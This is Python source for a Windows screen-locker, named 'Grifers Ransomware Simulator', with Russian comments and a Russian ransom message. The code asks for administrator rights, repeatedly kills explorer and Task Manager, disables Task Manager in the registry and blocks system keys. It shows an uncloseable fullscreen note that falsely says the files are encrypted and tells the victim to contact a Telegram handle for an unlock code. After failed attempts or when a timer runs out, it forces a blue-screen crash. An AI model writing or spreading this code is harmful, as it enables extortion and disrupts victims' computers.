# -*- coding: utf-8 -*-
"""
GRIFERS RANSOMWARE SIMULATOR - СМЕРТЬ С КОСОЙ (ТОЧНО КАК В ПРИМЕРЕ)
Анимация смерти с разными цветами фона через прямое управление консолью
Code: 1234 | Telegram: @ivan_abrikos
"""
import tkinter as tk
from tkinter import messagebox
import ctypes
import os
import sys
import socket
import threading
import time
import subprocess

# ==================== ASCII АРТ СМЕРТИ С КОСОЙ (ТОЧНО КАК В ПРИМЕРЕ) ====================
DEATH_ART = '''
             ;::::; 
           ;::::; :; 
         ;:::::'   :; 
        ;:::::;     ;. 
       ,:::::'       ;           OOO\\ 
       ::::::;       ;          OOOOO\\ 
       ;:::::;       ;         OOOOOOOO 
      ,;::::::;     ;'         / OOOOOOO 
    ;:::::::::`. ,,,;.        /  / DOOOOOO 
  .';:::::::::::::::::;,     /  /     DOOOO 
,::::::;::::::;;;;::::;,   /  /        DOOO 
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO 
::`:::::::`;:::::::: ;::::# /              DOO 
`:`:::::::`;:::::: ;::::::#/               DOO 
:::`:::::::`;; ;:::::::::##                OO 
::::`:::::::`;::::::::;:::#                OO 
`:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:# 
   ::::::`:::::;'  /  /   `#
'''

def show_fullscreen_death_python(color_code, duration=2):
    """Показывает полноэкранную смерть с косой через Python напрямую"""
    
    # Экранируем обратные слэши и кавычки для передачи в командную строку
    art_lines = DEATH_ART.strip('\n').split('\n')
    
    # Создаём команду для вывода
    python_code = f'''
import os
import ctypes
import time

death_art = """{DEATH_ART}"""

os.system('color {color_code}')
os.system('cls')
os.system('mode con cols=120 lines=50')

# Полноэкранный режим
try:
    hwnd = ctypes.windll.kernel32.GetConsoleWindow()
    if hwnd:
        ctypes.windll.user32.ShowWindow(hwnd, 3)
        ctypes.windll.user32.keybd_event(0x12, 0, 0, 0)
        ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0)
        time.sleep(0.05)
        ctypes.windll.user32.keybd_event(0x0D, 0, 2, 0)
        ctypes.windll.user32.keybd_event(0x12, 0, 2, 0)
except:
    pass

# Выводим смерть с косой
print()
print()
print()
print()
print()
print()
print()
print()
print()
for line in death_art.strip().split('\\n'):
    print(line)
print()
print()
print()
print()
print()

time.sleep({duration})
'''
    
    temp_py = os.path.join(os.environ['TEMP'], f'grifers_death_{color_code}.py')
    with open(temp_py, 'w', encoding='utf-8') as f:
        f.write(python_code)
    
    subprocess.Popen(f'start cmd /c python "{temp_py}"', shell=True)
    time.sleep(0.3)

def show_death_animation_sequence():
    """Показывает последовательность смертей с разными цветами фона"""
    
    colors = [
        ('04', 'КРАСНЫЙ'),
        ('01', 'СИНИЙ'),
        ('02', 'ЗЕЛЕНЫЙ'),
        ('05', 'ФИОЛЕТОВЫЙ'),
        ('04', 'КРАСНЫЙ'),
    ]
    
    for color_code, color_name in colors:
        show_fullscreen_death_python(color_code, duration=2)
        time.sleep(2)

# ==================== МГНОВЕННАЯ БЛОКИРОВКА ====================
def instant_lock():
    try:
        os.system("taskkill /f /im explorer.exe >nul 2>&1")
        os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
        os.system("taskkill /f /im cmd.exe >nul 2>&1")
        os.system("taskkill /f /im powershell.exe >nul 2>&1")
        os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f >nul 2>&1')
    except:
        pass

# ==================== КОНФИГ ====================
UNLOCK_CODE = "3883124"
PC_NAME = socket.gethostname()
TELEGRAM_CONTACT = "@PixelCheatHacker"

class GrifersRansomwareSimulator:
    def __init__(self):
        self.root = None
        self.entry = None
        self.attempts = 0
        self.max_attempts = 5
        self.time_remaining = 45 * 3600
        
        instant_lock()
        show_death_animation_sequence()
        self.create_gui()
        
    def create_gui(self):
        self.root = tk.Tk()
        self.root.title("Ваши файлы зашифрованы!")
        
        try:
            sw = self.root.winfo_screenwidth()
            sh = self.root.winfo_screenheight()
        except:
            sw, sh = 1920, 1080
            
        self.root.geometry(f"{sw}x{sh}+0+0")
        self.root.configure(bg='#0000aa')
        
        try:
            self.root.overrideredirect(True)
            self.root.attributes('-topmost', True)
            self.root.attributes('-fullscreen', True)
        except:
            pass
        
        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.block_keys()
        
        main_frame = tk.Frame(self.root, bg='#0000aa')
        main_frame.place(relx=0.5, rely=0.45, anchor=tk.CENTER)
        
        title = tk.Label(main_frame, text="Ваши файлы зашифрованы!",
                        font=('Arial', 28, 'bold'), fg='#ffffff', bg='#0000aa')
        title.pack(pady=(0, 20))
        
        main_text = f"""Упс! Вы подверглись масштабной хакерской атаке и теперь Ваш компьютер заблокирован,
а все имеющиеся диски и файлы на них зашифрованы хакерской группировкой.

Любые действия, связанные с попыткой обмануть систему нанесут непоправимый вред
Вашему компьютеру и приведут к потере всех важных файлов без возможности восстановления.

При попытке снять блокировку MBR (главный загрузчик материнки) будет снесён и будет подана
рекурсивная нагрузка на ваш процессор, что приведёт к его неисправности.

У вас есть 45 часов с момента запуска чтобы ввести код. Чтобы получить код, напишите {TELEGRAM_CONTACT} (Telegram)"""
        
        text_label = tk.Label(main_frame, text=main_text, font=('Arial', 13),
                             fg='#ffffff', bg='#0000aa', justify=tk.CENTER)
        text_label.pack(pady=10)
        
        code_label = tk.Label(main_frame, text="Введите код разблокировки:",
                             font=('Arial', 14), fg='#ffffff', bg='#0000aa')
        code_label.pack(pady=(30, 5))
        
        self.entry = tk.Entry(main_frame, font=('Arial', 14), show="",
                              bg='#ffffff', fg='#000000', width=25,
                              relief=tk.SUNKEN, bd=2,
                              justify='center')
        self.entry.pack(ipady=5)
        self.entry.focus()
        self.entry.bind('<Return>', lambda e: self.check_code())
        
        bottom_frame = tk.Frame(main_frame, bg='#0000aa')
        bottom_frame.pack(pady=20)
        
        pc_label = tk.Label(bottom_frame, text=f"Current PC: {PC_NAME}",
                           font=('Arial', 11), fg='#ffffff', bg='#0000aa')
        pc_label.pack(side=tk.LEFT, padx=(0, 20))
        
        enter_btn = tk.Button(bottom_frame, text="Enter [Ввод]", font=('Arial', 11),
                             bg='#e0e0e0', fg='#000000', relief=tk.RAISED, bd=2,
                             padx=20, pady=3, command=self.check_code)
        enter_btn.pack(side=tk.LEFT)
        
        self.attempts_label = tk.Label(main_frame, text="", font=('Arial', 10),
                                       fg='#ff6666', bg='#0000aa')
        self.attempts_label.pack(pady=10)
        
        self.timer_label = tk.Label(main_frame, text="", font=('Arial', 12),
                                     fg='#ff6600', bg='#0000aa')
        self.timer_label.pack(pady=5)
        self.start_timer()
        self.keep_locked()
        
        self.root.mainloop()
    
    def start_timer(self):
        def update_timer():
            while self.time_remaining > 0 and self.root:
                try:
                    hours = self.time_remaining // 3600
                    minutes = (self.time_remaining % 3600) // 60
                    seconds = self.time_remaining % 60
                    timer_text = f"Осталось времени: {hours:02d}:{minutes:02d}:{seconds:02d}"
                    if self.timer_label:
                        self.timer_label.config(text=timer_text)
                        if hours < 1:
                            color = '#ff0000' if int(time.time()) % 2 == 0 else '#ff6600'
                            self.timer_label.config(fg=color)
                    self.time_remaining -= 1
                    time.sleep(1)
                    if self.time_remaining <= 0:
                        if self.root:
                            self.root.after(0, self.destroy_system)
                        break
                except:
                    break
        threading.Thread(target=update_timer, daemon=True).start()
    
    def keep_locked(self):
        def lock_thread():
            while True:
                try:
                    os.system("taskkill /f /im explorer.exe >nul 2>&1")
                    os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
                except:
                    pass
                time.sleep(2)
        threading.Thread(target=lock_thread, daemon=True).start()
    
    def block_keys(self):
        def block():
            try:
                import keyboard
                blocked = ['ctrl', 'win', 'windows', 'esc', 'alt', 'f4', 
                          'delete', 'tab', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12']
                for key in blocked:
                    try:
                        keyboard.block_key(key)
                    except:
                        pass
            except:
                pass
        threading.Thread(target=block, daemon=True).start()
    
    def unlock_system(self):
        try:
            os.system('reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /f >nul 2>&1')
            os.system("start explorer.exe")
        except:
            pass
        
    def destroy_system(self):
        try:
            ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
            ctypes.windll.ntdll.NtRaiseHardError(0xC0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_ulong()))
        except:
            os.system("shutdown /r /t 0 /f")
            
    def check_code(self):
        code = self.entry.get().strip()
        if code == UNLOCK_CODE:
            self.unlock_system()
            self.root.destroy()
            return
        self.attempts += 1
        remaining = self.max_attempts - self.attempts
        self.attempts_label.config(text=f"Осталось попыток: {remaining}")
        self.entry.delete(0, tk.END)
        if self.attempts >= self.max_attempts:
            self.destroy_system()
        else:
            messagebox.showerror("Неверный код", f"Неверный код разблокировки!\nОсталось попыток: {remaining}")

if __name__ == "__main__":
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            sys.exit()
    except:
        pass
    
    try:
        mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Grifers_Ransomware_Mutex_V18")
        if ctypes.windll.kernel32.GetLastError() == 183:
            sys.exit(0)
    except:
        pass
        
    GrifersRansomwareSimulator()